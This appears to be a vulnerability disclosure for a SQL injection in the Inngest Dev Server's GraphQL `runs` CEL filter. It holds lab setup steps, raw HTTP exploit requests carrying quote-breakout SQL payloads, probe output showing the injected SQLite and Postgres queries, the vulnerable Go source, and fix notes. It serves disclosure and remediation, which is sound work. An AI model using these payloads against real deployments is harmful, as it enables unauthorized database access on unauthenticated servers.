### Vulnerability details

**Official website / Product:** https://www.inngest.com / https://github.com/inngest/inngest

**Repository:** inngest/inngest (stars at selection: 6008)

**Vulnerability type:** SQLi (CEL `runs(filter.query)` → unsanitized JSON fieldPath into SQLite `json_extract` / Postgres `#>>`)

**Vulnerability versions:** Inngest Dev Server **1.49.0-28cb5336b** (release tag `v1.49.0` / commit `28cb533`); audited source tip `236eeec7821fad4ead8c099a76ed107c964590ea`. Lab: alpine:3.20 + official CLI linux_amd64 binary (fallback when Docker Hub `inngest/inngest:v1.49.0` pull stalled), host port **19207**. Default local/dev mode `/v0/gql` requires **no authentication** (no credentials).

**Vulnerability URL / Parameter:**
- `POST /v0/gql` — GraphQL field `runs` → argument `filter.query` (CEL expression)
- Dev API sets `Preview: true`, so non-empty CEL routes through `GetRuns` → `spanRunCELFilters` → `SpanEventSQLiteConverter` / `SpanEventPostgresConverter`

**Complex:** yes

### Verification procedure

1. Bring up the lab (original `labs/inngest-r12a7/` was cleaned; use either option below):
   - **Preferred:** on alpine:3.20 or the host, download the official CLI  
     `https://github.com/inngest/inngest/releases/download/v1.49.0/inngest_1.49.0_linux_amd64.tar.gz`  
     then run: `./inngest dev --no-discovery -p 19207` (binary version string `1.49.0-28cb5336b`).
   - **Alternate:** `docker run --rm -p 19207:19207 inngest/inngest:v1.49.0 inngest dev --no-discovery -p 19207 --host 0.0.0.0`
   - DB: Dev Server default in-memory SQLite; no seeded runs required. Optional mock SDK on host :19087 is not needed for this PoC.
2. Send a benign CEL filter on `runs` (baseline request below); response is HTTP 200 with empty `edges` (no SQL error).
3. Send a CEL filter that uses a JSON map-key literal containing `')` plus SQL, and a second predicate `event.data.vars.q == "z"` so the CEL parser lifts the key into the identifier (literal-lift bypass of the single-predicate syntax reject).
4. Observe GraphQL error `SQL logic error: incomplete input` — the broken SQL proves the key was concatenated into `json_extract(..., '$....')`.

### Complete vulnerability PoC

Baseline (benign CEL) request (Docker-verified):

```http
POST /v0/gql HTTP/1.1
Host: 127.0.0.1:19207
User-Agent: r12-a7-poc/1.0
Accept: application/json
Content-Type: application/json
Content-Length: 261
Connection: close

{"query": "query { runs(first: 5, orderBy: [{field: QUEUED_AT, direction: DESC}], filter: {from: \"2026-10-25T00:00:00Z\", query: \"event.data.foo == \\\"bar\\\" && event.data.vars.q == \\\"z\\\"\"}) { edges { node { id status } } pageInfo { hasNextPage } } }"}
```

Baseline (benign CEL) response:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Vary: Origin
Vary: Origin
X-Inngest-Server-Kind: dev
Date: Sun, 01 Nov 2026 15:13:24 GMT
Content-Length: 63
Connection: close

{"data":{"runs":{"edges":[],"pageInfo":{"hasNextPage":false}}}}
```

Exploit HTTP request (Docker-verified):

```http
POST /v0/gql HTTP/1.1
Host: 127.0.0.1:19207
User-Agent: r12-a7-poc/1.0
Accept: application/json
Content-Type: application/json
Content-Length: 347
Connection: close

{"query": "query { runs(first: 5, orderBy: [{field: QUEUED_AT, direction: DESC}], filter: {from: \"2026-10-25T00:00:00Z\", query: \"event.data.foo[\\\"x') AND CAST((SELECT CASE WHEN 1=1 THEN sqlite_version() ELSE 0 END) AS INT)--\\\"] == \\\"y\\\" && event.data.vars.q == \\\"z\\\"\"}) { edges { node { id status } } pageInfo { hasNextPage } } }"}
```

Exploit HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Content-Type: application/json
Vary: Origin
Vary: Origin
X-Inngest-Server-Kind: dev
Date: Sun, 01 Nov 2026 15:13:24 GMT
Content-Length: 115
Connection: close

{"errors":[{"message":"error retrieving runs: SQL logic error: incomplete input (1)","path":["runs"]}],"data":null}
```

Verification result notes:

- Benign CEL returns `{"data":{"runs":{"edges":[],"pageInfo":{"hasNextPage":false}}}}`.
- Injected CEL returns GraphQL errors with `SQL logic error: incomplete input (1)` — SQLite rejected the concatenated SQL fragment.
- Unit probe (`pkg/run` ToSQLFilters) renders injected SQL when the `vars.q` second predicate is present (`INJECTION VISIBLE IN SQL`):

```text
# sqlite-with-vars
Ident="event.data.foo[x') OR 1=1 OR (']" Op=_==_ Lit="y"
Ident="event.data.vars.q" Op=_==_ Lit="z"
SQL: SELECT * FROM `events` WHERE ((json_extract(NULLIF(events.event_data, ''), '$.foo[x') OR 1=1 OR (']') = 'y') AND (json_extract(NULLIF(events.event_data, ''), '$.vars.q') = 'z'))
args: []interface {}{}
INJECTION VISIBLE IN SQL

# sqlite-plain (no second predicate) → CEL rejects
Error: invalid syntax detected

# postgres-with-vars
SQL: SELECT * FROM "events" WHERE (((NULLIF(events.event_data, '')::jsonb)#>>'{foo[x') OR 1=1 OR (']}' = 'y') AND ((NULLIF(events.event_data, '')::jsonb)#>>'{vars,q}' = 'z'))
INJECTION VISIBLE IN SQL

# postgres-comma (`}` / `{` breakout)
SQL: SELECT * FROM "events" WHERE (((NULLIF(events.event_data, '')::jsonb)#>>'{foo[x'} || 1=1 || '{]}' = 'y') AND ((NULLIF(events.event_data, '')::jsonb)#>>'{vars,q}' = 'z'))
INJECTION VISIBLE IN SQL
```

- A single-predicate `event.data.foo["x') OR 1=1 OR ('"]` is rejected by CEL as `invalid syntax detected`; the second predicate is required for the lift bypass.
- Same `fieldPath` concatenation exists for Postgres (`#>>'{...}'`).

### Vulnerability analysis

GraphQL `runs(filter.query)` accepts a CEL blob. The Dev Server resolver always sets `Preview: true` (`pkg/coreapi/graph/resolvers/runs_v2.go:427`). When CEL is non-empty, `GetTraceRuns` delegates to `GetRuns` → `spanRunCELFilters` → `ExpressionHandler.ToSQLFilters` with `SpanEventSQLiteConverter` (or Postgres).

For `event.data.*` predicates, `spanEventConverter` strips the prefix and passes the remaining identifier as `fieldPath` into `handleSQLiteJSONFilter` / `handlePostgresJSONFilter`. Those helpers format `fieldPath` directly into SQL string literals:

- SQLite: `json_extract(<expr>, '$.' + fieldPath)`
- Postgres: `<expr>#>>'{' + path + '}'`

A CEL map access like `event.data.foo["x') OR 1=1 OR ('"]` alone is rejected as invalid syntax. Adding a second predicate (e.g. `&& event.data.vars.q == "z"`) causes the expression engine to lift the bracketed key into the Ident string, so the quote/paren breakout reaches SQL. Dev Server `/v0/gql` requires no auth in default local/dev mode.

### Trigger / sink source (full path and line numbers)

```go
# File: pkg/run/cel_sql.go
# Lines: 170-172 (SQLite sink); 198-202 (Postgres sink)
# Audited commit: 236eeec7821fad4ead8c099a76ed107c964590ea
func handleSQLiteJSONFilter(expr, fieldPath string, literal interface{}, op string) ([]sq.Expression, error) {
	jsonPath := fmt.Sprintf("$.%s", fieldPath)
	jsonExpr := fmt.Sprintf("json_extract(%s, '%s')", expr, jsonPath)

	switch v := literal.(type) {
	case string:
		return handleStringOp(jsonExpr, v, op)
	case int64, float64:
		numExpr := fmt.Sprintf("CAST(%s AS NUMERIC)", jsonExpr)
		return handleNumericOp(numExpr, v, op)
	case bool:
		boolInt := 0
		if v {
			boolInt = 1
		}
		return handleNumericOp(jsonExpr, boolInt, op)
	case nil:
		jsonTypeExpr := fmt.Sprintf("json_type(%s, '%s')", expr, jsonPath)
		return handleNullOp(jsonTypeExpr, op)
	default:
		return nil, fmt.Errorf("unsupported literal type: %T", literal)
	}
}

func handlePostgresJSONFilter(expr, fieldPath string, literal interface{}, op string) ([]sq.Expression, error) {
	pathParts := strings.Split(fieldPath, ".")
	pgPath := fmt.Sprintf("{%s}", strings.Join(pathParts, ","))
	jsonExpr := fmt.Sprintf("%s#>>'%s'", expr, pgPath)
	// continues with handleStringOp / handleNumericOp by literal type; fieldPath is not escaped
}
```

Call path:

```go
# File: pkg/coreapi/graph/resolvers/runs_v2.go — Preview: true (line ~427)
# File: pkg/cqrs/manager/cqrs.go — GetTraceRuns (lines ~2503-2505): Preview → GetRuns
# File: pkg/cqrs/manager/cqrs.go — GetRuns (line ~3251) calls spanRunCELFilters (~3276)
# File: pkg/cqrs/manager/cqrs.go — spanRunCELFilters (lines ~3734-3766)
func spanRunCELFilters(
	ctx context.Context,
	opt cqrs.GetTraceRunOpt,
	h driverhelp.DialectHelpers,
) ([]sq.Expression, bool, error) {
	if opt.Filter.CEL == "" {
		return celFilters, useJoin, nil
	}
	expHandler, err := run.NewExpressionHandler(ctx,
		run.WithExpressionHandlerBlob(opt.Filter.CEL, "\n"),
		run.WithExpressionSQLConverter(h.CELConverter()),
	)
	// ...
	celFilters, err = expHandler.ToSQLFilters(ctx)
	useJoin = needsEventJoin(opt.Filter.CEL)
	return celFilters, useJoin, nil
}
```

### Fix notes

- Treat CEL JSON field paths as untrusted: allowlist `[A-Za-z0-9_.]` (or escape single quotes / `]` / `{`/`}`/`,` for each dialect) before interpolating into `json_extract` / `#>>`.
- Prefer bound parameters or a JSON path API that does not embed the path inside a SQL string literal.
- Reject identifiers containing SQL metacharacters at CEL→SQL conversion time.
